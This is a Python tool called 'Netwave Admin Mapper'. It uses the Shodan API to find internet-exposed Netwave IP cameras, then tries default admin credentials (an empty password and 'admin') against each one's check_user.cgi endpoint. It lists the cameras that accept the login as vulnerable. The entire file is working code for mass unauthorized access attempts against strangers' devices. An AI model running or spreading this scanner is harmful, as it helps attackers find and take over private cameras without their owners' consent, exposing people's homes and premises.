import shodan
import requests
import sys
import argparse
from multiprocessing import Process, Queue
from random import randrange
from time import sleep

banner = r"""
      _   ___          __     __  __ 
     | \ | \ \        / /\   |  \/  |
     |  \| |\ \  /\  / /  \  | \  / |
     | . ` | \ \/  \/ / /\ \ | |\/| |
     | |\  |  \  /\  / ____ \| |  | |
     |_| \_|   \/  \/_/    \_\_|  |_| 
"""
bannertext = """
          Netwave Admin Mapper
  ~~Why didn't you change the password?~~"""
about = """
Netwave Admin Mapper
Created by JoaoVitorBF

Thanks to:
achillean == shodan-python
kennethreitz == requests
vanpersiexp == the awesome

And to all the contributors in those repos!"""

def process_ip(ip, port, queue):
    try:
        reqa = requests.get("http://{}:{}/check_user.cgi".format(ip, port),
            auth=requests.auth.HTTPBasicAuth("admin", ""),
            timeout=5)
        reqb = requests.get("http://{}:{}/check_user.cgi".format(ip, port),
            auth=requests.auth.HTTPBasicAuth("admin", "admin"),
            timeout=5)

        if reqa.text[0] == "v" or reqb.text[0] == "v":
            queue.put(ip+":"+port)
        else:
            queue.put("Failed "+ip+":"+port)

    except KeyboardInterrupt:
        queue.put("F")
        print("Process interrupted.", file=sys.stderr)
        sys.exit(0)
    except Exception:
        queue.put("F")

def get_shodan_results(api, searchstr, curpage, max_retries=5, retry_delay=5):
    retries = 0
    while retries < max_retries:
        try:
            results = api.search(searchstr, page=curpage)
            if 'matches' in results:
                return results
            else:
                print("Shodan returned no matches, retrying...")
                retries += 1
                sleep(retry_delay)
        except shodan.APIError as e:
            print(f"Shodan API Error: {e}, retrying...")
            retries += 1
            sleep(retry_delay)
        except Exception as e:
            print(f"Unexpected error: {e}, retrying...")
            retries += 1
            sleep(retry_delay)
    print("Failed to retrieve results after multiple retries. Exiting...")
    sys.exit(1)

if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser(description=banner, formatter_class=argparse.RawDescriptionHelpFormatter)
        parser.add_argument('key', help="Your Shodan API key")
        parser.add_argument('-q', metavar="options", help="Your Shodan query options (example: \"city:\\\"Chicago\\\"\")")
        parser.add_argument('-c', metavar="count", help="Amount of threads to use for mapping (default: 10)", type=int, default=10)
        parser.add_argument('-o', metavar="file", type=str, help="Output vulnerable IPs to file")
        parser.add_argument('--out-failed', metavar="file", type=str, help="Output IPs that failed to login to file")
        parser.add_argument('--silent', action="store_true", help="Silence all stdout output")
        parser.add_argument('--iponly', action="store_true", help="Output only vulnerable IPs to stdout")
        parser.add_argument('--about', help="About NWAM", action="store_true")
        args = parser.parse_args()
        if args.silent and args.iponly:
            print("--silent and --iponly are incompatible", file=sys.stderr)
            quit()
        
        if args.about:
            print(banner)
            print(about)
            quit()

        if args.o:
            outfile = open(args.o, "a")
        if args.out_failed:
            outfailedfile = open(args.out_failed, "a")

        if args.silent == False and args.iponly == False:
            print(banner+bannertext+"\n\n")

        api = shodan.Shodan(args.key)
        searchstr = "Netwave"
        if args.q:
            searchstr += (" "+args.q)
            if args.silent == False and args.iponly == False:
                print("Searching with options: "+args.q)
        
        curpage = 1
        while True:
            results = get_shodan_results(api, searchstr, curpage)
            if curpage == 1 and args.silent == False and args.iponly == False:
                print("Shodan returned {} results!\n".format(results["total"]))
            
            if args.c > int(results["total"]):
                threads = int(results["total"])
            else:
                threads = args.c

            q = Queue()
            runningcount = 0
            processed = 0
            vulnerable = 0

            if len(results['matches']) == 0 and args.silent == False and args.iponly == False:
                print("Mapping done! Quitting...")
                quit()
            elif args.silent == False and args.iponly == False:
                print("Processing page {}...".format(curpage))
            
            for result in results['matches']:
                if runningcount < threads:
                    p = Process(target=process_ip, args=(result["ip_str"], str(result["port"]), q,))
                    p.start()
                    runningcount += 1
                else:
                    res = q.get(timeout=6)
                    if res[0] != "F":
                        if args.iponly and args.silent == False: print(res)
                        elif args.silent == False: print("[VULN] "+res)
                        if args.o: outfile.write(res+"\n")
                        vulnerable += 1
                    elif args.out_failed and res != "F":
                        outfailedfile.write(res.split(" ")[1]+"\n")
                    processed += 1
                    p = Process(target=process_ip, args=(result["ip_str"], str(result["port"]), q,))
                    p.start()

            while runningcount > 0:
                res = q.get(timeout=6)
                if res[0] != "F":
                    if args.iponly and args.silent == False: print(res)
                    elif args.silent == False: print("[VULN] "+res)
                    if args.o: outfile.write(res+"\n")
                    vulnerable += 1
                elif args.out_failed and res != "F":
                    outfailedfile.write(res.split(" ")[1]+"\n")
                processed += 1
                runningcount -= 1  

            if args.silent == False and args.iponly == False:
                print("Processed {} cameras, {} vulnerable.\n".format(processed, vulnerable))
            curpage += 1

    except shodan.APIError as e:
        print(e)
    except KeyboardInterrupt:
        print("SIGINT! Interrupting mapper...", file=sys.stderr)
        sys.exit(0)
    except Exception as e:
        print(sys.exc_info()[0].__name__)
